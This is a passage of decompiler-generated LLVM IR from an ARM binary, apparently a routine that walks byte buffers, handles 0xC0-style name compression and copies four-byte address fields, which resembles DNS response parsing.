  br i1 %v9_fae4, label %dec_label_pc_fb40, label %dec_label_pc_faec

dec_label_pc_faec:                                ; preds = %dec_label_pc_fae4
  %v0_faec = load i32, i32* @r5, align 4
  %v1_faec = add i32 %v0_faec, -156
  %v2_faec = inttoptr i32 %v1_faec to i32*
  %v3_faec = load i32, i32* %v2_faec, align 4
  %v1_faf0 = load i32, i32* @r7, align 4
  %v6_faf0 = lshr i32 %v3_faec, %v1_faf0
  store i32 %v6_faf0, i32* %r3.global-to-local, align 4
  %v1_faf4 = urem i32 %v6_faf0, 2
  %v2_faf4 = icmp eq i32 %v1_faf4, 0
  store i1 %v2_faf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_faf4, label %dec_label_pc_fb60, label %dec_label_pc_fafc

dec_label_pc_fafc:                                ; preds = %dec_label_pc_faec
  store i32 %v2_fb00, i32* @r5, align 4
  store i32 %v2_fb00, i32* @r1, align 4
  store i32 2048, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fb10 = load i32, i32* @r6, align 4
  store i32 %v0_fb10, i32* @r0, align 4
  %v0_fb1c = call i32 @function_14a2c()
  store i32 %v0_fb1c, i32* %r4.global-to-local, align 4
  %v0_fb24 = load i32, i32* @sb, align 4
  store i32 %v0_fb24, i32* %r0.global-to-local, align 4
  %v1_fb28 = inttoptr i32 %v0_fb24 to i8*
  %v2_fb28 = call i32 @function_12324(i8* %v1_fb28)
  %v1_fb2c = add i32 %v2_fb28, 17
  store i32 %v1_fb2c, i32* %r0.global-to-local, align 4
  %v0_fb30 = load i32, i32* %r4.global-to-local, align 4
  %v3_fb30 = icmp ult i32 %v0_fb30, %v1_fb2c
  %v9_fb30 = icmp eq i32 %v0_fb30, %v1_fb2c
  store i1 %v9_fb30, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* @r4, align 4
  br i1 %v3_fb30, label %dec_label_pc_fb40, label %dec_label_pc_fb94

dec_label_pc_fb40:                                ; preds = %dec_label_pc_fafc, %dec_label_pc_fb94, %dec_label_pc_fbc0, %dec_label_pc_fae4, %dec_label_pc_fb88
  %v0_fb40 = load i32, i32* @r8, align 4
  %v7_fb40 = icmp eq i32 %v0_fb40, 5
  store i1 %v7_fb40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb40, label %dec_label_pc_fb60, label %dec_label_pc_fb48

dec_label_pc_fb48:                                ; preds = %dec_label_pc_fb50, %dec_label_pc_fb40
  %v0_fb48 = phi i32 [ %v0_fb58, %dec_label_pc_fb50 ], [ %v0_fb40, %dec_label_pc_fb40 ]
  %v1_fb48 = add i32 %v0_fb48, 1
  %v0_f9dc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f9dc

dec_label_pc_fb50:                                ; preds = %dec_label_pc_fa1c, %dec_label_pc_fa04
  %v0_fb50 = phi i32 [ %v4_fa2c, %dec_label_pc_fa1c ], [ %v3_fa10, %dec_label_pc_fa04 ]
  %v1_fb50 = add i32 %v0_fb50, 2
  store i32 %v1_fb50, i32* %r0.global-to-local, align 4
  %v1_fb54 = call i32 @function_15c0c(i32 %v1_fb50)
  store i32 %v1_fb54, i32* %r0.global-to-local, align 4
  %v0_fb58 = load i32, i32* @r8, align 4
  %v7_fb58 = icmp eq i32 %v0_fb58, 5
  store i1 %v7_fb58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb58, label %dec_label_pc_fb60, label %dec_label_pc_fb48

dec_label_pc_fb60:                                ; preds = %dec_label_pc_fb50, %dec_label_pc_fb40, %dec_label_pc_faec, %dec_label_pc_fa84, %dec_label_pc_fbcc, %dec_label_pc_fbd4.backedge
  %v0_fb60 = load i32, i32* @r6, align 4
  store i32 %v0_fb60, i32* @r0, align 4
  %v1_fb64 = call i32 @function_15b20(i32 %v0_fb60)
  store i32 %v1_fb64, i32* %r0.global-to-local, align 4
  %v0_fb68 = load i32, i32* @fp, align 4
  %v1_fb68 = inttoptr i32 %v0_fb68 to i8*
  %v2_fb68 = load i8, i8* %v1_fb68, align 1
  %v3_fb68 = zext i8 %v2_fb68 to i32
  store i32 %v3_fb68, i32* @r4, align 4
  %v2_fb6c = icmp eq i8 %v2_fb68, 0
  store i1 %v2_fb6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb6c, label %dec_label_pc_fcb4, label %dec_label_pc_fb74

dec_label_pc_fb74:                                ; preds = %dec_label_pc_fb60, %dec_label_pc_fcb4
  %v0_fb74 = phi i32 [ %v0_fb68, %dec_label_pc_fb60 ], [ %v0_fcc8, %dec_label_pc_fcb4 ]
  store i32 %v0_fb74, i32* %r0.global-to-local, align 4
  store i32 %v3_f874, i32* @r4, align 4
  store i32 %v9_f874, i32* @r6, align 4
  store i32 %v12_f874, i32* @r7, align 4
  store i32 %v15_f874, i32* @r8, align 4
  store i32 %v18_f874, i32* @sb, align 4
  store i32 %v21_f874, i32* @sl, align 4
  store i32 %v24_f874, i32* @fp, align 4
  store i32 %v27_f874, i32* @lr, align 4
  ret i32 %v0_fb74

dec_label_pc_fb88:                                ; preds = %bb117
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_fb8c = call i32 @function_15c0c(i32 1)
  store i32 %v1_fb8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fb40

dec_label_pc_fb94:                                ; preds = %dec_label_pc_fafc
  store i32 %v2_fb94, i32* @sb, align 4
  store i32 %v2_fb94, i32* %r0.global-to-local, align 4
  %v2_fb9c = call i32 @function_12324(i8* %v1_fb9c)
  store i32 %v2_fa90, i32* @lr, align 4
  %v4_fba8 = load i16, i16* %stack_var_-4292, align 2
  %v5_fba8 = sext i16 %v4_fba8 to i32
  store i32 %v5_fba8, i32* %r3.global-to-local, align 4
  store i32 %v6_f944, i32* %r1.global-to-local, align 4
  %v1_fbb0 = load i32, i32* @sb, align 4
  %v2_fbb0 = add i32 %v1_fbb0, %v2_fb9c
  store i32 %v2_fbb0, i32* %r0.global-to-local, align 4
  %v9_fbb4 = icmp eq i16 %v4_fba8, %v5_f95c
  store i1 %v9_fbb4, i1* %cpsr_z.global-to-local, align 1
  %v1_fbb8 = add i32 %v2_fbb0, 5
  store i32 %v1_fbb8, i32* @r4, align 4
  br i1 %v9_fbb4, label %dec_label_pc_fbc0, label %dec_label_pc_fb40

dec_label_pc_fbc0:                                ; preds = %dec_label_pc_fb94
  store i32 %v4_fbc0, i32* %r0.global-to-local, align 4
  store i1 %v2_fbc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fbc4, label %dec_label_pc_fb40, label %dec_label_pc_fbcc

dec_label_pc_fbcc:                                ; preds = %dec_label_pc_fbc0
  %v1_fbcc = call i32 @function_149f4(i32 %v4_fbc0)
  store i32 %v1_fbcc, i32* %r0.global-to-local, align 4
  %v1_fbd4133 = add i32 %v1_fbcc, -1
  %v3_fbd8134 = mul i32 %v1_fbd4133, 65536
  store i32 %v3_fbd8134, i32* %r3.global-to-local, align 4
  %v7_fbdc140 = icmp eq i32 %v3_fbd8134, -65536
  store i1 %v7_fbdc140, i1* %cpsr_z.global-to-local, align 1
  %v3_fbe0141 = urem i32 %v1_fbd4133, 65536
  store i32 %v3_fbe0141, i32* @sl, align 4
  br i1 %v7_fbdc140, label %dec_label_pc_fb60, label %dec_label_pc_fbe8.lr.ph

dec_label_pc_fbe8.lr.ph:                          ; preds = %dec_label_pc_fbcc
  %v0_fbe8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fbe8

dec_label_pc_fbe8:                                ; preds = %dec_label_pc_fbe8.lr.ph, %dec_label_pc_fbd4.backedge
  %v0_fbe8 = phi i32 [ %v0_fbe8.pre, %dec_label_pc_fbe8.lr.ph ], [ %storemerge29, %dec_label_pc_fbd4.backedge ]
  store i32 %v0_fbe8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_fbf418 = inttoptr i32 %v0_fbe8 to i8*
  %v2_fbf419 = load i8, i8* %v1_fbf418, align 1
  %v3_fbf420 = zext i8 %v2_fbf419 to i32
  store i32 %v3_fbf420, i32* %r2.global-to-local, align 4
  %v2_fbf821 = icmp eq i8 %v2_fbf419, 0
  store i1 %v2_fbf821, i1* %cpsr_z.global-to-local, align 1
  %v3_fbfc22 = mul nuw nsw i32 %v3_fbf420, 256
  store i32 %v3_fbfc22, i32* %r1.global-to-local, align 4
  br i1 %v2_fbf821, label %dec_label_pc_fc30, label %dec_label_pc_fc04.preheader

dec_label_pc_fc04.preheader:                      ; preds = %dec_label_pc_fbe8, %dec_label_pc_fbf4.backedge
  %v1_fcd8 = phi i32 [ %v1_fcd849, %dec_label_pc_fbf4.backedge ], [ 1, %dec_label_pc_fbe8 ]
  %v0_fcd047 = phi i32 [ %v0_fcd0, %dec_label_pc_fbf4.backedge ], [ 0, %dec_label_pc_fbe8 ]
  %v0_fc1045 = phi i32 [ %v3_fbfc, %dec_label_pc_fbf4.backedge ], [ %v3_fbfc22, %dec_label_pc_fbe8 ]
  %v0_fc0c43 = phi i32 [ %v1_fcd4, %dec_label_pc_fbf4.backedge ], [ %v0_fbe8, %dec_label_pc_fbe8 ]
  %v0_fc0441 = phi i32 [ %v3_fbf4, %dec_label_pc_fbf4.backedge ], [ %v3_fbf420, %dec_label_pc_fbe8 ]
  br label %dec_label_pc_fc04

dec_label_pc_fc04:                                ; preds = %dec_label_pc_fc04.preheader, %dec_label_pc_fc0c
  %v0_fcd0 = phi i32 [ %v0_fcd047, %dec_label_pc_fc04.preheader ], [ 1, %dec_label_pc_fc0c ]
  %v0_fc10 = phi i32 [ %v0_fc1045, %dec_label_pc_fc04.preheader ], [ %v3_fc28, %dec_label_pc_fc0c ]
  %v0_fcd4 = phi i32 [ %v0_fc0c43, %dec_label_pc_fc04.preheader ], [ %v2_fc18, %dec_label_pc_fc0c ]
  %v0_fc04 = phi i32 [ %v0_fc0441, %dec_label_pc_fc04.preheader ], [ %v3_fc1c, %dec_label_pc_fc0c ]
  %v7_fc04 = icmp eq i32 %v0_fc04, 191
  store i1 %v7_fc04, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v0_fc04, 192
  br i1 %tmp, label %dec_label_pc_fcd0, label %dec_label_pc_fc0c

dec_label_pc_fc0c:                                ; preds = %dec_label_pc_fc04
  %v1_fc0c = add i32 %v0_fcd4, 1
  %v2_fc0c = inttoptr i32 %v1_fc0c to i8*
  %v3_fc0c = load i8, i8* %v2_fc0c, align 1
  %v4_fc0c = zext i8 %v3_fc0c to i32
  %v2_fc10 = or i32 %v4_fc0c, -49152
  %v0_fc18 = load i32, i32* @r5, align 4
  %v1_fc14 = add i32 %v0_fc18, %v0_fc10
  %v2_fc18 = add i32 %v1_fc14, %v2_fc10
  store i32 %v2_fc18, i32* %r3.global-to-local, align 4
  %v1_fc1c = inttoptr i32 %v2_fc18 to i8*
  %v2_fc1c = load i8, i8* %v1_fc1c, align 1
  %v3_fc1c = zext i8 %v2_fc1c to i32
  store i32 %v3_fc1c, i32* %r2.global-to-local, align 4
  %v2_fc20 = icmp eq i8 %v2_fc1c, 0
  store i1 %v2_fc20, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_fc28 = mul nuw nsw i32 %v3_fc1c, 256
  store i32 %v3_fc28, i32* %r1.global-to-local, align 4
  br i1 %v2_fc20, label %dec_label_pc_fc30, label %dec_label_pc_fc04

dec_label_pc_fc30:                                ; preds = %dec_label_pc_fbf4.backedge, %dec_label_pc_fc0c, %dec_label_pc_fbe8
  %v1_fc34 = phi i32 [ 1, %dec_label_pc_fbe8 ], [ %v1_fcd8, %dec_label_pc_fc0c ], [ %v1_fcd849, %dec_label_pc_fbf4.backedge ]
  %v0_fc30 = phi i32 [ 0, %dec_label_pc_fbe8 ], [ 1, %dec_label_pc_fc0c ], [ %v0_fcd0, %dec_label_pc_fbf4.backedge ]
  %v7_fc30 = icmp eq i32 %v0_fc30, 1
  store i1 %v7_fc30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc30, label %bb118, label %bb119

bb118:                                            ; preds = %dec_label_pc_fc30
  %v2_fc34 = add i32 %v1_fc34, 1
  store i32 %v2_fc34, i32* %r0.global-to-local, align 4
  br label %bb119

bb119:                                            ; preds = %dec_label_pc_fc30, %bb118
  %v1_fc40 = phi i32 [ %v1_fc34, %dec_label_pc_fc30 ], [ %v2_fc34, %bb118 ]
  %v2_fc38 = add i32 %v1_fc40, %v0_fbe8
  store i32 %v2_fc38, i32* @r7, align 4
  %v1_fc3c = add i32 %v2_fc38, 1
  %v2_fc3c = inttoptr i32 %v1_fc3c to i8*
  %v3_fc3c = load i8, i8* %v2_fc3c, align 1
  %v4_fc3c = zext i8 %v3_fc3c to i32
  store i32 %v4_fc3c, i32* %r3.global-to-local, align 4
  %v3_fc40 = inttoptr i32 %v2_fc38 to i8*
  %v4_fc40 = load i8, i8* %v3_fc40, align 1
  %v6_fc40 = zext i8 %v4_fc40 to i32
  store i32 1, i32* %r0.global-to-local, align 4
  %v4_fc48 = mul nuw nsw i32 %v4_fc3c, 256
  %v5_fc48 = or i32 %v6_fc40, %v4_fc48
  store i32 %v5_fc48, i32* %r4.global-to-local, align 4
  %v1_fc4c = call i32 @function_1484c(i32 1)
  store i32 %v1_fc4c, i32* %r0.global-to-local, align 4
  %v9_fc50 = icmp eq i32 %v5_fc48, %v1_fc4c
  store i1 %v9_fc50, i1* %cpsr_z.global-to-local, align 1
  %v0_fc54 = load i32, i32* @r7, align 4
  %v1_fc54 = add i32 %v0_fc54, 10
  store i32 %v1_fc54, i32* @r8, align 4
  br i1 %v9_fc50, label %dec_label_pc_fcf0, label %dec_label_pc_fc5c

dec_label_pc_fc5c:                                ; preds = %dec_label_pc_fcf0.dec_label_pc_fc5c_crit_edge, %bb119
  %v0_fcac = phi i32 [ %v0_fc5c.pre, %dec_label_pc_fcf0.dec_label_pc_fc5c_crit_edge ], [ %v1_fc54, %bb119 ]
  store i32 %v0_fcac, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_fc6824 = inttoptr i32 %v0_fcac to i8*
  %v2_fc6825 = load i8, i8* %v1_fc6824, align 1
  %v3_fc6826 = zext i8 %v2_fc6825 to i32
  store i32 %v3_fc6826, i32* %r2.global-to-local, align 4
  %v2_fc6c27 = icmp eq i8 %v2_fc6825, 0
  store i1 %v2_fc6c27, i1* %cpsr_z.global-to-local, align 1
  %v3_fc7028 = mul nuw nsw i32 %v3_fc6826, 256
  store i32 %v3_fc7028, i32* %r1.global-to-local, align 4
  br i1 %v2_fc6c27, label %dec_label_pc_fca4, label %dec_label_pc_fc78.preheader

dec_label_pc_fc78.preheader:                      ; preds = %dec_label_pc_fc5c, %dec_label_pc_fc68.backedge
  %v1_fce8 = phi i32 [ %v1_fce865, %dec_label_pc_fc68.backedge ], [ 1, %dec_label_pc_fc5c ]
  %v0_fce063 = phi i32 [ %v0_fce0, %dec_label_pc_fc68.backedge ], [ 0, %dec_label_pc_fc5c ]
  %v0_fc8461 = phi i32 [ %v3_fc70, %dec_label_pc_fc68.backedge ], [ %v3_fc7028, %dec_label_pc_fc5c ]
  %v0_fc8059 = phi i32 [ %v1_fce4, %dec_label_pc_fc68.backedge ], [ %v0_fcac, %dec_label_pc_fc5c ]
  %v0_fc7857 = phi i32 [ %v3_fc68, %dec_label_pc_fc68.backedge ], [ %v3_fc6826, %dec_label_pc_fc5c ]
  br label %dec_label_pc_fc78

dec_label_pc_fc78:                                ; preds = %dec_label_pc_fc78.preheader, %dec_label_pc_fc80
  %v0_fce0 = phi i32 [ %v0_fce063, %dec_label_pc_fc78.preheader ], [ 1, %dec_label_pc_fc80 ]
  %v0_fc84 = phi i32 [ %v0_fc8461, %dec_label_pc_fc78.preheader ], [ %v3_fc9c, %dec_label_pc_fc80 ]
  %v0_fce4 = phi i32 [ %v0_fc8059, %dec_label_pc_fc78.preheader ], [ %v2_fc8c, %dec_label_pc_fc80 ]
  %v0_fc78 = phi i32 [ %v0_fc7857, %dec_label_pc_fc78.preheader ], [ %v3_fc90, %dec_label_pc_fc80 ]
  %v7_fc78 = icmp eq i32 %v0_fc78, 191
  store i1 %v7_fc78, i1* %cpsr_z.global-to-local, align 1
  %tmp157 = icmp ult i32 %v0_fc78, 192
  br i1 %tmp157, label %dec_label_pc_fce0, label %dec_label_pc_fc80

dec_label_pc_fc80:                                ; preds = %dec_label_pc_fc78
  %v1_fc80 = add i32 %v0_fce4, 1
  %v2_fc80 = inttoptr i32 %v1_fc80 to i8*
  %v3_fc80 = load i8, i8* %v2_fc80, align 1
  %v4_fc80 = zext i8 %v3_fc80 to i32
  %v2_fc84 = or i32 %v4_fc80, -49152
  %v0_fc8c = load i32, i32* @r5, align 4
  %v1_fc88 = add i32 %v0_fc8c, %v0_fc84
  %v2_fc8c = add i32 %v1_fc88, %v2_fc84
  store i32 %v2_fc8c, i32* %r3.global-to-local, align 4
  %v1_fc90 = inttoptr i32 %v2_fc8c to i8*
  %v2_fc90 = load i8, i8* %v1_fc90, align 1
  %v3_fc90 = zext i8 %v2_fc90 to i32
  store i32 %v3_fc90, i32* %r2.global-to-local, align 4
  %v2_fc94 = icmp eq i8 %v2_fc90, 0
  store i1 %v2_fc94, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_fc9c = mul nuw nsw i32 %v3_fc90, 256
  store i32 %v3_fc9c, i32* %r1.global-to-local, align 4
  br i1 %v2_fc94, label %dec_label_pc_fca4, label %dec_label_pc_fc78

dec_label_pc_fca4:                                ; preds = %dec_label_pc_fc68.backedge, %dec_label_pc_fc80, %dec_label_pc_fc5c
  %v1_fca8 = phi i32 [ 1, %dec_label_pc_fc5c ], [ %v1_fce8, %dec_label_pc_fc80 ], [ %v1_fce865, %dec_label_pc_fc68.backedge ]
  %v0_fca4 = phi i32 [ 0, %dec_label_pc_fc5c ], [ 1, %dec_label_pc_fc80 ], [ %v0_fce0, %dec_label_pc_fc68.backedge ]
  %v7_fca4 = icmp eq i32 %v0_fca4, 1
  store i1 %v7_fca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fca4, label %bb120, label %bb121

bb120:                                            ; preds = %dec_label_pc_fca4
  %v2_fca8 = add i32 %v1_fca8, 1
  store i32 %v2_fca8, i32* %r0.global-to-local, align 4
  br label %bb121

bb121:                                            ; preds = %dec_label_pc_fca4, %bb120
  %v1_fcac = phi i32 [ %v1_fca8, %dec_label_pc_fca4 ], [ %v2_fca8, %bb120 ]
  %v2_fcac = add i32 %v1_fcac, %v0_fcac
  br label %dec_label_pc_fbd4.backedge

dec_label_pc_fbd4.backedge:                       ; preds = %bb121, %dec_label_pc_fd80
  %storemerge29 = phi i32 [ %v2_fcac, %bb121 ], [ %v2_fd90, %dec_label_pc_fd80 ]
  store i32 %storemerge29, i32* @r4, align 4
  %v0_fbd4.pre = load i32, i32* @sl, align 4
  %v1_fbd4 = add i32 %v0_fbd4.pre, -1
  %v3_fbd8 = mul i32 %v1_fbd4, 65536
  store i32 %v3_fbd8, i32* %r3.global-to-local, align 4
  %v7_fbdc = icmp eq i32 %v3_fbd8, -65536
  store i1 %v7_fbdc, i1* %cpsr_z.global-to-local, align 1
  %v3_fbe0 = urem i32 %v1_fbd4, 65536
  store i32 %v3_fbe0, i32* @sl, align 4
  br i1 %v7_fbdc, label %dec_label_pc_fb60, label %dec_label_pc_fbe8

dec_label_pc_fcb4:                                ; preds = %dec_label_pc_fb60
  %v1_fcb4 = add i32 %v0_fb68, 4
  %v2_fcb4 = inttoptr i32 %v1_fcb4 to i32*
  %v3_fcb4 = load i32, i32* %v2_fcb4, align 4
  store i32 %v3_fcb4, i32* %r0.global-to-local, align 4
  %v2_fcb8 = icmp eq i32 %v3_fcb4, 0
  store i1 %v2_fcb8, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_fcc0.190 to i32), i32* @lr, align 4
  %v1_fcbc = xor i1 %v2_fcb8, true
  call void @__pseudo_cond_branch(i1 %v1_fcbc, i32 ptrtoint (i32* @global_var_13780.57 to i32))
  %v0_fcc0 = load i32, i32* @fp, align 4
  store i32 %v0_fcc0, i32* %r0.global-to-local, align 4
  %v1_fcc4 = call i32 @function_13780(i32 %v0_fcc0)
  store i32 %v1_fcc4, i32* %r0.global-to-local, align 4
  %v0_fcc8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_fb74

dec_label_pc_fcd0:                                ; preds = %dec_label_pc_fc04
  %v2_fcd0 = icmp eq i32 %v0_fcd0, 0
  store i1 %v2_fcd0, i1* %cpsr_z.global-to-local, align 1
  %v1_fcd4 = add i32 %v0_fcd4, 1
  store i32 %v1_fcd4, i32* %r3.global-to-local, align 4
  br i1 %v2_fcd0, label %bb122, label %dec_label_pc_fbf4.backedge

dec_label_pc_fbf4.backedge:                       ; preds = %dec_label_pc_fcd0, %bb122
  %v1_fcd849 = phi i32 [ %v1_fcd8, %dec_label_pc_fcd0 ], [ %v2_fcd8, %bb122 ]
  %v1_fbf4 = inttoptr i32 %v1_fcd4 to i8*
  %v2_fbf4 = load i8, i8* %v1_fbf4, align 1
  %v3_fbf4 = zext i8 %v2_fbf4 to i32
  store i32 %v3_fbf4, i32* %r2.global-to-local, align 4
  %v2_fbf8 = icmp eq i8 %v2_fbf4, 0
  store i1 %v2_fbf8, i1* %cpsr_z.global-to-local, align 1
  %v3_fbfc = mul nuw nsw i32 %v3_fbf4, 256
  store i32 %v3_fbfc, i32* %r1.global-to-local, align 4
  br i1 %v2_fbf8, label %dec_label_pc_fc30, label %dec_label_pc_fc04.preheader

bb122:                                            ; preds = %dec_label_pc_fcd0
  %v2_fcd8 = add i32 %v1_fcd8, 1
  store i32 %v2_fcd8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fbf4.backedge

dec_label_pc_fce0:                                ; preds = %dec_label_pc_fc78
  %v2_fce0 = icmp eq i32 %v0_fce0, 0
  store i1 %v2_fce0, i1* %cpsr_z.global-to-local, align 1
  %v1_fce4 = add i32 %v0_fce4, 1
  store i32 %v1_fce4, i32* %r3.global-to-local, align 4
  br i1 %v2_fce0, label %bb123, label %dec_label_pc_fc68.backedge

dec_label_pc_fc68.backedge:                       ; preds = %dec_label_pc_fce0, %bb123
  %v1_fce865 = phi i32 [ %v1_fce8, %dec_label_pc_fce0 ], [ %v2_fce8, %bb123 ]
  %v1_fc68 = inttoptr i32 %v1_fce4 to i8*
  %v2_fc68 = load i8, i8* %v1_fc68, align 1
  %v3_fc68 = zext i8 %v2_fc68 to i32
  store i32 %v3_fc68, i32* %r2.global-to-local, align 4
  %v2_fc6c = icmp eq i8 %v2_fc68, 0
  store i1 %v2_fc6c, i1* %cpsr_z.global-to-local, align 1
  %v3_fc70 = mul nuw nsw i32 %v3_fc68, 256
  store i32 %v3_fc70, i32* %r1.global-to-local, align 4
  br i1 %v2_fc6c, label %dec_label_pc_fca4, label %dec_label_pc_fc78.preheader

bb123:                                            ; preds = %dec_label_pc_fce0
  %v2_fce8 = add i32 %v1_fce8, 1
  store i32 %v2_fce8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc68.backedge

dec_label_pc_fcf0:                                ; preds = %bb119
  %v1_fcf0 = add i32 %v0_fc54, 2
  %v2_fcf0 = inttoptr i32 %v1_fcf0 to i8*
  %v3_fcf0 = load i8, i8* %v2_fcf0, align 1
  %v4_fcf0 = zext i8 %v3_fcf0 to i32
  store i32 %v4_fcf0, i32* %r4.global-to-local, align 4
  %v1_fcf4 = add i32 %v0_fc54, 3
  %v2_fcf4 = inttoptr i32 %v1_fcf4 to i8*
  %v3_fcf4 = load i8, i8* %v2_fcf4, align 1
  %v4_fcf4 = zext i8 %v3_fcf4 to i32
  store i32 %v4_fcf4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v4_fcfc = mul nuw nsw i32 %v4_fcf4, 256
  %v5_fcfc = or i32 %v4_fcfc, %v4_fcf0
  store i32 %v5_fcfc, i32* @r4, align 4
  %v1_fd00 = call i32 @function_1484c(i32 1)
  store i32 %v1_fd00, i32* %r0.global-to-local, align 4
  %v0_fd04 = load i32, i32* @r4, align 4
  %v9_fd04 = icmp eq i32 %v0_fd04, %v1_fd00
  store i1 %v9_fd04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fd04, label %dec_label_pc_fd0c, label %dec_label_pc_fcf0.dec_label_pc_fc5c_crit_edge

dec_label_pc_fcf0.dec_label_pc_fc5c_crit_edge:    ; preds = %dec_label_pc_fcf0
  %v0_fc5c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_fc5c

dec_label_pc_fd0c:                                ; preds = %dec_label_pc_fcf0
  %v0_fd0c = load i32, i32* @r7, align 4
  %v1_fd0c = add i32 %v0_fd0c, 8
  %v2_fd0c = inttoptr i32 %v1_fd0c to i8*
  %v3_fd0c = load i8, i8* %v2_fd0c, align 1
  %v4_fd0c = zext i8 %v3_fd0c to i32
  store i32 %v4_fd0c, i32* %r3.global-to-local, align 4
  %v1_fd10 = add i32 %v0_fd0c, 9
  %v2_fd10 = inttoptr i32 %v1_fd10 to i8*
  %v3_fd10 = load i8, i8* %v2_fd10, align 1
  %v4_fd10 = zext i8 %v3_fd10 to i32
  %v4_fd14 = mul nuw nsw i32 %v4_fd10, 256
  %v5_fd14 = or i32 %v4_fd14, %v4_fd0c
  store i32 %v5_fd14, i32* %r0.global-to-local, align 4
  %v1_fd18 = call i32 @function_149f4(i32 %v5_fd14)
  store i32 %v1_fd18, i32* %r0.global-to-local, align 4
  %v7_fd1c = icmp eq i32 %v1_fd18, 4
  store i1 %v7_fd1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd1c, label %dec_label_pc_fd24, label %dec_label_pc_fd80

dec_label_pc_fd24:                                ; preds = %dec_label_pc_fd0c
  %v0_fd24 = load i32, i32* @r7, align 4
  %v1_fd24 = add i32 %v0_fd24, 10
  %v2_fd24 = inttoptr i32 %v1_fd24 to i8*
  %v3_fd24 = load i8, i8* %v2_fd24, align 1
  %v4_fd24 = zext i8 %v3_fd24 to i32
  store i32 %v4_fd24, i32* %r3.global-to-local, align 4
  store i32 %v2_f90c, i32* %r2.global-to-local, align 4
  %v0_fd30 = load i32, i32* @r8, align 4
  %v1_fd30 = add i32 %v0_fd30, 1
  %v2_fd30 = inttoptr i32 %v1_fd30 to i8*
  %v3_fd30 = load i8, i8* %v2_fd30, align 1
  %v4_fd30 = zext i8 %v3_fd30 to i32
  store i32 %v4_fd30, i32* %r2.global-to-local, align 4
  store i32 %v2_f90c, i32* %r3.global-to-local, align 4
  %v1_fd3c = add i32 %v0_fd30, 2
  %v2_fd3c = inttoptr i32 %v1_fd3c to i8*
  %v3_fd3c = load i8, i8* %v2_fd3c, align 1
  %v4_fd3c = zext i8 %v3_fd3c to i32
  store i32 %v4_fd3c, i32* %r3.global-to-local, align 4
  store i32 %v2_f90c, i32* %ip.global-to-local, align 4
  %v1_fd48 = add i32 %v0_fd30, 3
  %v2_fd48 = inttoptr i32 %v1_fd48 to i8*
  %v3_fd48 = load i8, i8* %v2_fd48, align 1
  %v4_fd48 = zext i8 %v3_fd48 to i32
  store i32 %v4_fd48, i32* %r2.global-to-local, align 4
  %v0_fd50 = load i32, i32* @fp, align 4
  %v1_fd50 = inttoptr i32 %v0_fd50 to i8*
  %v2_fd50 = load i8, i8* %v1_fd50, align 1
  %v3_fd50 = zext i8 %v2_fd50 to i32
  %v1_fd54 = mul nuw nsw i32 %v3_fd50, 4
  %v3_fd58 = add nuw nsw i32 %v1_fd54, 4
  store i32 %v3_fd58, i32* %r1.global-to-local, align 4
  %v1_fd5c = add i32 %v0_fd50, 4
  %v2_fd5c = inttoptr i32 %v1_fd5c to i32*
  %v3_fd5c = load i32, i32* %v2_fd5c, align 4
  store i32 %v3_fd5c, i32* %r0.global-to-local, align 4
  %v3_fd60 = sext i8 %v3_fd48 to i32
  %v5_fd60 = sext i8 %v3_fd3c to i32
  %v10_fd60 = call i32 @function_143c8(i32 %v3_fd5c, i32 %v3_fd58, i32 %v3_fd60, i32 %v5_fd60)
  store i32 %v10_fd60, i32* %r0.global-to-local, align 4
  %v0_fd64 = load i32, i32* @fp, align 4
  %v1_fd64 = inttoptr i32 %v0_fd64 to i8*
  %v2_fd64 = load i8, i8* %v1_fd64, align 1
  %v3_fd64 = zext i8 %v2_fd64 to i32
  store i32 %v3_fd64, i32* %r2.global-to-local, align 4
  store i32 %v2_f90c, i32* @lr, align 4
  %v4_fd6c = sext i8 %v3_fd24 to i32
  store i32 %v4_fd6c, i32* %r3.global-to-local, align 4
  %v1_fd70 = add nuw nsw i32 %v3_fd64, 1
  store i32 %v1_fd70, i32* %r1.global-to-local, align 4
  %v5_fd74 = mul nuw nsw i32 %v3_fd64, 4
  %v6_fd74 = add i32 %v5_fd74, %v10_fd60
  %v7_fd74 = inttoptr i32 %v6_fd74 to i32*
  store i32 %v4_fd6c, i32* %v7_fd74, align 4
  %v1_fd78 = load i32, i32* @fp, align 4
  %v2_fd78 = add i32 %v1_fd78, 4
  %v3_fd78 = inttoptr i32 %v2_fd78 to i32*
  store i32 %v10_fd60, i32* %v3_fd78, align 4
  %v0_fd7c = load i32, i32* %r1.global-to-local, align 4
  %v1_fd7c = trunc i32 %v0_fd7c to i8
  %v2_fd7c = load i32, i32* @fp, align 4
  %v3_fd7c = inttoptr i32 %v2_fd7c to i8*
  store i8 %v1_fd7c, i8* %v3_fd7c, align 1
  br label %dec_label_pc_fd80

